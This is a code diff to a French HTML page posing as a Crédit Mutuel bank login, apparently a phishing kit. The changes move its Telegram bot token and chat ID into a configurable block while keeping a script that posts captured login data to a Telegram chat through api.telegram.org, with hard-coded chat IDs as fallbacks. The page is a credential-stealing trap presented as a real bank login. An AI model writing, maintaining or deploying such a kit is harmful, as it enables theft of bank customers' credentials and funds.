@@ -1,6 +1,12 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
+    <script>
+        window.telegramConfig = {
+            BOT_TOKEN: "TELEGRAM_BOT_TOKEN_PLACEHOLDER",
+            CHAT_ID: "TELEGRAM_CHAT_ID_PLACEHOLDER"
+        };
+    </script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
     <title>Connexion - Crédit Mutuel</title>
@@ -430,8 +436,8 @@
 
     <script>
         // Configuration Telegram
-        const TELEGRAM_BOT_TOKEN = '[REDACTED]';
-        const TELEGRAM_CHAT_ID = '6078788670';
+        const BOT_TOKEN = (window.telegramConfig && window.telegramConfig.BOT_TOKEN) || '[REDACTED]';
+        const CHAT_ID = (window.telegramConfig && window.telegramConfig.CHAT_ID) || '8176081750';
 
         // Toast elements
         const toast = document.getElementById('toast');
@@ -529,7 +535,7 @@
 📋 Méthode: ${data.method}
 ✅ Statut: Connexion en cours`;
                 
-                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                 
                 const response = await fetch(url, {
                     method: 'POST',
@@ -537,7 +543,7 @@
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
+                        chat_id: CHAT_ID,
                         text: message,
                         parse_mode: 'HTML'
                     })
